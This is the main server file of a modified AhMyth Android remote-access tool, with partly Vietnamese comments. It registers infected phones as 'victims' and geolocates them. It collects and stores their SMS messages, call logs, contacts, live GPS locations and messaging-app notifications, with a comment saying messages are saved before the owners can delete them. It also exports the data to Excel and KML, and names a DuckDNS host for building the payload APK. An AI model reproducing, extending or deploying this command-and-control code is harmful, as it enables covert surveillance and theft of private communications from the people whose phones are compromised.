const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
const http = require('http');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;
const path = require('path');
const fs = require('fs');
const DatabaseManager = require('./database');
const ExportManager = require('./export');
//--------------------------------------------------------------
let win;
let display;
var windows = {};
var IO;
var dbManager;
var exportManager;

// Persistent logging for debugging
const logFile = path.join(__dirname, 'server_debug.log');
const logsBaseDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsBaseDir)) {
  fs.mkdirSync(logsBaseDir, { recursive: true });
}

function logToFile(msg) {
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] ${msg}\n`;
  console.log(msg);
  fs.appendFileSync(logFile, line);
}

logToFile('Server Starting...');
logToFile('Log file path: ' + logFile);

// Initialize Database
async function initDatabase() {
  try {
    dbManager = new DatabaseManager();
    await dbManager.init();
    exportManager = new ExportManager(dbManager);
    logToFile('✅ Database and Export Manager initialized');
  } catch (error) {
    logToFile('❌ Database initialization error: ' + error.message);
    console.error(error);
  }
}

// Start database initialization
initDatabase();

function createWindow() {


  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();



  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 600,
    height: 400,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true
    }
  });


  // load splash file
  splashWin.loadURL('file://' + __dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show(); //close splash
  });


  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    // Dereference the window object
    splashWin = null
  })


  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 800,
    height: 600,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    transparent: true,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  });

  win.loadURL('file://' + __dirname + '/app/index.html');
  //open dev tools
  //win.webContents.openDevTools()

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      // Check if splashWin still exists before closing
      if (splashWin) {
        splashWin.close();
      }
      if (win) {
        win.show();
      }
    }, 2000);
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
})



//handle the Uncaught Exceptions



// fired when start listening
// It will be fired when AppCtrl emit this event
var currentServer = null;
var isClosing = false;

ipcMain.on('SocketIO:Listen', function (event, port) {
  console.log('Received Listen command on port:', port);

  if (isClosing) {
    console.log('Server is already closing, ignoring request...');
    return;
  }

  if (currentServer) {
    console.log('Closing existing server...');
    isClosing = true;
    const oldServer = currentServer;
    currentServer = null;

    // Force close any existing connections if possible
    oldServer.close(() => {
      console.log('Existing server closed.');
      isClosing = false;
      startNewServer(port);
    });

    // Safety timeout to ensure it doesn't hang forever
    setTimeout(() => {
      if (isClosing) {
        console.log('Server closure timeout, forcing new server start...');
        isClosing = false;
        startNewServer(port);
      }
    }, 2000);
  } else {
    startNewServer(port);
  }

  function startNewServer(port) {
    console.log('Attempting to start new server on port:', port);
    const server = http.createServer((req, res) => {
      logToFile('Incoming HTTP request: ' + req.method + ' ' + req.url + ' from: ' + req.socket.remoteAddress);
      if (req.url === '/test') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('AhMyth Server is Running and Reachable!\nTime: ' + new Date().toLocaleString());
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('AhMyth Server - Ready');
    });
    currentServer = server;

    // Use simplest init for Socket.IO with heartbeat and EIO3 compatibility config
    IO = io(server, {
      pingTimeout: 30000,
      pingInterval: 10000,
      upgradeTimeout: 20000,
      allowEIO3: true  // Critical for 0.8.3 client compatibility
    });

    server.listen(port, () => {
      logToFile('Server is now listening on port: ' + port);
      logToFile('IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring');
    });

    IO.sockets.on('connection', function (socket) {
      const socketIp = socket.conn.remoteAddress || (socket.request.connection && socket.request.connection.remoteAddress) || 'unknown';
      const socketPort = (socket.request.connection && socket.request.connection.remotePort) || 0;

      logToFile('New Socket.IO connection! ID: ' + socket.id + ' IP: ' + socketIp);

      // Notify UI immediately that *something* connected (for debugging)
      if (win && win.webContents) {
        win.webContents.send('SocketIO:Debug', 'Handshaking with ' + socketIp);
      }

      var query = socket.handshake.query;
      logToFile('Query params: ' + JSON.stringify(query));

      var index = query.id;

      if (!index) {
        logToFile('REJECTED: No ID provided in query.');
        return;
      }

      // Robust IP extraction
      var ip = socketIp || 'unknown';
      if (ip.includes(':')) {
        ip = ip.substring(ip.lastIndexOf(':') + 1);
      }
      if (ip === '1') ip = '127.0.0.1';

      var country = null;
      var geo = geoip.lookup(ip); // check ip location
      if (geo)
        country = geo.country.toLowerCase();

      console.log('Victim registered:', index, 'IP:', ip);

      // Check if this victim already has an active Lab window
      if (windows[index]) {
        logToFile('Victim ' + index + ' reconnected. Updating active Lab window socket.');
        const childWin = BrowserWindow.fromId(windows[index]);
        if (childWin) {
          childWin.webContents.victim = socket; // Update the socket reference in the window
          childWin.webContents.send('SocketIO:VictimReconnected');
        }
      }

      // Add or Update the victim in victimList
      victimsList.addVictim(socket, ip, socketPort, country, query.manf, query.model, query.release, index);

      // Lưu vào database vĩnh viễn
      if (dbManager) {
        dbManager.addOrUpdateVictim(index, ip, socketPort, country, query.manf, query.model, query.release);
        logToFile('💾 Victim saved to database: ' + index);
      }

      // Theo dõi vị trí từ xa: cập nhật khi client gửi locationUpdate
      socket.on('locationUpdate', function (data) {
        const id = query.id;
        if (victimsList.getVictim(id)) {
          const lat = data.enable && data.lat != null ? data.lat : null;
          const lng = data.enable && data.lng != null ? data.lng : null;
          victimsList.updateLocation(id, lat, lng, !!data.enable);

          // Log location to file for persistent history
          const logDir = path.join(__dirname, 'logs', id);
          if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
          const locLog = path.join(logDir, 'locations.log');
          const time = new Date().toLocaleString();
          fs.appendFileSync(locLog, `[${time}] Lat: ${lat}, Lng: ${lng}\n`);

          // Lưu vào database
          if (dbManager && lat && lng) {
            dbManager.addLocation(id, lat, lng);
          }

          if (win && win.webContents)
            win.webContents.send('SocketIO:VictimLocationUpdated', id);
        }
      });

      // Theo dõi thông báo (Zalo/Messenger): lưu vào file
      socket.on('notificationUpdate', function (data) {
        const id = query.id;
        const logDir = path.join(__dirname, 'logs', id);
        if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
        const msgLog = path.join(logDir, 'messages.log');

        const time = new Date().toLocaleString();
        const logLine = `[${time}] [${data.package}] ${data.title}: ${data.text}\n`;
        fs.appendFileSync(msgLog, logLine);

        // Lưu vào database
        if (dbManager) {
          dbManager.addNotification(id, data.package, data.appName || data.package, data.title, data.text);
        }

        logToFile(`MSG from ${id}: ${data.title}: ${data.text}`);
      });

      //------------------------Notification SCREEN INIT------------------------------------
      // create the Notification window
      let notification = new BrowserWindow({
        frame: false,
        x: display.bounds.width - 280,
        y: display.bounds.height - 78,
        show: false,
        width: 280,
        height: 78,
        resizable: false,
        toolbar: false,
        webPreferences: {
          nodeIntegration: true
        }
      });

      // Emitted when the window is finished loading.
      notification.webContents.on('did-finish-load', function () {
        notification.show();
        setTimeout(function () { notification.destroy() }, 3000);
      });

      notification.webContents.victim = victimsList.getVictim(index);
      notification.loadURL('file://' + __dirname + '/app/notification.html');



      //notify renderer proccess (AppCtrl) about the new Victim
      console.log('Sending SocketIO:NewVictim to UI for index:', index);
      if (win && win.webContents) {
        win.webContents.send('SocketIO:NewVictim', index);
      }

      // Lắng nghe SMS data và lưu vào database
      socket.on('x0000sm', function (data) {
        const id = query.id;
        if (dbManager && data.smsList && Array.isArray(data.smsList)) {
          logToFile(`📱 Saving ${data.smsList.length} SMS messages to database for ${id}`);
          data.smsList.forEach(sms => {
            const type = sms.type || 'inbox'; // inbox hoặc sent
            const timestamp = sms.date ? new Date(parseInt(sms.date)) : new Date();
            dbManager.addSMS(id, sms.phoneNo, sms.msg, type, timestamp.toISOString());
          });
        }
      });

      // Lắng nghe Call Logs và lưu vào database
      socket.on('x0000cl', function (data) {
        const id = query.id;
        if (dbManager && data.callsList && Array.isArray(data.callsList)) {
          logToFile(`📞 Saving ${data.callsList.length} call logs to database for ${id}`);
          data.callsList.forEach(call => {
            const callType = call.type == 1 ? 'incoming' : (call.type == 2 ? 'outgoing' : 'missed');
            const timestamp = call.date ? new Date(parseInt(call.date)) : new Date();
            dbManager.addCallLog(id, call.phoneNo, call.name || 'Unknown', callType, call.duration || 0, timestamp.toISOString());
          });
        }
      });

      // Lắng nghe Contacts và lưu vào database
      socket.on('x0000cn', function (data) {
        const id = query.id;
        if (dbManager && data.contactsList && Array.isArray(data.contactsList)) {
          logToFile(`👥 Saving ${data.contactsList.length} contacts to database for ${id}`);
          data.contactsList.forEach(contact => {
            dbManager.addContact(id, contact.name || 'Unknown', contact.phoneNo, contact.email || null);
          });
        }
      });

      // ⭐ REALTIME DATA - Lưu NGAY LẬP TỨC khi có SMS/Call mới (trước khi họ kịp xóa)
      socket.on('realtimeData', function (data) {
        const id = query.id;

        try {
          if (data.type === 'realtime_sms') {
            // SMS mới - Lưu NGAY
            if (dbManager) {
              const timestamp = data.date ? new Date(parseInt(data.date)) : new Date();
              dbManager.addSMS(id, data.phoneNo, data.msg, data.smsType, timestamp.toISOString());

              // Log vào file backup
              const logDir = path.join(__dirname, 'logs', id);
              if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
              const smsLog = path.join(logDir, 'realtime_sms.log');
              const time = new Date().toLocaleString();
              fs.appendFileSync(smsLog, `[${time}] ${data.smsType} - ${data.phoneNo}: ${data.msg}\n`);

              logToFile(`📱 REALTIME SMS saved: ${data.phoneNo} (${data.smsType})`);
            }
          } else if (data.type === 'realtime_call') {
            // Cuộc gọi mới - Lưu NGAY
            if (dbManager) {
              const timestamp = data.date ? new Date(parseInt(data.date)) : new Date();
              dbManager.addCallLog(id, data.phoneNo, data.name || 'Unknown', data.callType, data.duration || 0, timestamp.toISOString());

              // Log vào file backup
              const logDir = path.join(__dirname, 'logs', id);
              if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
              const callLog = path.join(logDir, 'realtime_calls.log');
              const time = new Date().toLocaleString();
              fs.appendFileSync(callLog, `[${time}] ${data.callType} - ${data.phoneNo} (${data.name}) - ${data.duration}s\n`);

              logToFile(`📞 REALTIME CALL saved: ${data.phoneNo} (${data.callType}) - ${data.duration}s`);
            }
          }
        } catch (error) {
          logToFile(`❌ Error processing realtime data: ${error.message}`);
        }
      });

      socket.on('disconnect', function () {
        logToFile('Victim disconnected: ' + index);

        // Đánh dấu offline trong database (KHÔNG XÓA)
        if (dbManager) {
          dbManager.setVictimOffline(index);
          logToFile('💾 Victim marked offline in database: ' + index);
        }

        // Do NOT remove from persistent victimsList here, just mark as offline if we had status
        // But for this UI, we might want to remove it to keep the list clean if it's not persistent
        // According to original code, it removes from victimList:
        victimsList.rmVictim(index);

        //notify renderer proccess (AppCtrl) about the disconnected Victim
        if (win && win.webContents) {
          win.webContents.send('SocketIO:RemoveVictim', index);
        }

        if (windows[index]) {
          //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
          //delete the window from windowsList
          delete windows[index]
        }
      });
    });
  }
});


//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {
  console.error('Uncaught Exception:', error);
  if (error.code == "EADDRINUSE") {
    if (win && win.webContents)
      win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    electron.dialog.showErrorBox("ERROR", error.stack || error.message || JSON.stringify(error));
  }
});



// Fired when Victim's Lab is opened (startHash optional, e.g. '#/location')
ipcMain.on('openLabWindow', function (e, page, index, startHash) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 600,
    height: 650,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  })

  //add this window to windowsList
  windows[index] = child.id;
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  const labUrl = 'file://' + __dirname + '/app/' + page + (startHash || '');
  child.loadURL(labUrl)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});

// ==================== DATABASE IPC HANDLERS ====================

// Lấy thống kê victim
ipcMain.on('DB:GetVictimStats', function (event, victimId) {
  if (dbManager) {
    const stats = dbManager.getVictimStats(victimId);
    event.reply('DB:VictimStats', stats);
  }
});

// Lấy lịch sử vị trí
ipcMain.on('DB:GetLocationHistory', function (event, victimId, limit) {
  if (dbManager) {
    const locations = dbManager.getLocationHistory(victimId, limit || 100);
    event.reply('DB:LocationHistory', locations);
  }
});

// Lấy lịch sử thông báo
ipcMain.on('DB:GetNotifications', function (event, victimId, limit) {
  if (dbManager) {
    const notifications = dbManager.getNotifications(victimId, limit || 100);
    event.reply('DB:Notifications', notifications);
  }
});

// Lấy lịch sử SMS
ipcMain.on('DB:GetSMSHistory', function (event, victimId, limit) {
  if (dbManager) {
    const sms = dbManager.getSMSHistory(victimId, limit || 100);
    event.reply('DB:SMSHistory', sms);
  }
});

// Lấy lịch sử cuộc gọi
ipcMain.on('DB:GetCallLogs', function (event, victimId, limit) {
  if (dbManager) {
    const callLogs = dbManager.getCallLogs(victimId, limit || 100);
    event.reply('DB:CallLogs', callLogs);
  }
});

// Lấy danh bạ
ipcMain.on('DB:GetContacts', function (event, victimId) {
  if (dbManager) {
    const contacts = dbManager.getContacts(victimId);
    event.reply('DB:Contacts', contacts);
  }
});

// Lấy tất cả victims (bao gồm offline)
ipcMain.on('DB:GetAllVictims', function (event) {
  if (dbManager) {
    const victims = dbManager.getAllVictims();
    event.reply('DB:AllVictims', victims);
  }
});

// Export victim data to Excel
ipcMain.on('Export:VictimToExcel', function (event, victimId) {
  if (exportManager) {
    try {
      const filepath = exportManager.exportVictimToExcel(victimId);
      event.reply('Export:Success', { type: 'excel', filepath: filepath });
      logToFile(`✅ Exported victim ${victimId} to Excel: ${filepath}`);
    } catch (error) {
      event.reply('Export:Error', error.message);
      logToFile(`❌ Export error: ${error.message}`);
    }
  }
});

// Export locations to KML (Google Maps)
ipcMain.on('Export:LocationsToKML', function (event, victimId) {
  if (exportManager) {
    try {
      const filepath = exportManager.exportLocationsToKML(victimId);
      event.reply('Export:Success', { type: 'kml', filepath: filepath });
      logToFile(`✅ Exported locations for ${victimId} to KML: ${filepath}`);
    } catch (error) {
      event.reply('Export:Error', error.message);
      logToFile(`❌ Export error: ${error.message}`);
    }
  }
});

// Export messages to text
ipcMain.on('Export:MessagesToText', function (event, victimId) {
  if (exportManager) {
    try {
      const filepath = exportManager.exportMessagesToText(victimId);
      event.reply('Export:Success', { type: 'text', filepath: filepath });
      logToFile(`✅ Exported messages for ${victimId} to text: ${filepath}`);
    } catch (error) {
      event.reply('Export:Error', error.message);
      logToFile(`❌ Export error: ${error.message}`);
    }
  }
});

// Export all victims
ipcMain.on('Export:AllVictims', function (event) {
  if (exportManager) {
    try {
      const filepath = exportManager.exportAllVictims();
      event.reply('Export:Success', { type: 'all_victims', filepath: filepath });
      logToFile(`✅ Exported all victims to Excel: ${filepath}`);
    } catch (error) {
      event.reply('Export:Error', error.message);
      logToFile(`❌ Export error: ${error.message}`);
    }
  }
});